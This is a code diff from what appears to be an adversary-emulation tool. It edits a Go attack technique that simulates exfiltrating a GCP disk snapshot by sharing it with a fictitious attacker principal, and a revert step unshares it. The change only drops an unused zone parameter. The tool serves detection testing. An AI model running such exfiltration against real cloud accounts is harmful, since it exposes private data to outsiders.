@@ -100,11 +100,10 @@ protoPayload.methodName="v1.compute.snapshots.setIamPolicy"
 func detonate(params map[string]string, providers stratus.CloudProviders) error {
 	gcp := providers.GCP()
 	snapshotName := params["snapshot_name"]
-	zone := params["zone"]
 	attackerPrincipal := gcp_utils.GetAttackerPrincipal()
 
 	log.Println("Exfiltrating " + snapshotName + " by sharing it with a fictitious attacker")
-	if err := shareSnapshot(context.Background(), gcp, snapshotName, zone, attackerPrincipal); err != nil {
+	if err := shareSnapshot(context.Background(), gcp, snapshotName, attackerPrincipal); err != nil {
 		return fmt.Errorf("failed to share snapshot: %w", err)
 	}
 	log.Println("Successfully shared snapshot with a fictitious attacker account " + attackerPrincipal)
@@ -114,17 +113,16 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 func revert(params map[string]string, providers stratus.CloudProviders) error {
 	gcp := providers.GCP()
 	snapshotName := params["snapshot_name"]
-	zone := params["zone"]
 
 	log.Println("Unsharing " + snapshotName)
-	if err := unshareSnapshot(context.Background(), gcp, snapshotName, zone); err != nil {
+	if err := unshareSnapshot(context.Background(), gcp, snapshotName); err != nil {
 		return fmt.Errorf("unable to unshare snapshot: %w", err)
 	}
 	log.Println("Successfully unshared the snapshot - it is now private again")
 	return nil
 }
 
-func shareSnapshot(ctx context.Context, gcp *providers.GCPProvider, snapshotName string, zone string, targetPrincipal string) error {
+func shareSnapshot(ctx context.Context, gcp *providers.GCPProvider, snapshotName string, targetPrincipal string) error {
 	snapshotClient, err := compute.NewSnapshotsRESTClient(ctx, gcp.Options())
 	if err != nil {
 		return fmt.Errorf("unable to create compute client: %w", err)
@@ -152,7 +150,7 @@ func shareSnapshot(ctx context.Context, gcp *providers.GCPProvider, snapshotName
 	return nil
 }
 
-func unshareSnapshot(ctx context.Context, gcp *providers.GCPProvider, snapshotName string, zone string) error {
+func unshareSnapshot(ctx context.Context, gcp *providers.GCPProvider, snapshotName string) error {
 	snapshotClient, err := compute.NewSnapshotsRESTClient(ctx, gcp.Options())
 	if err != nil {
 		return fmt.Errorf("unable to create compute client: %w", err)
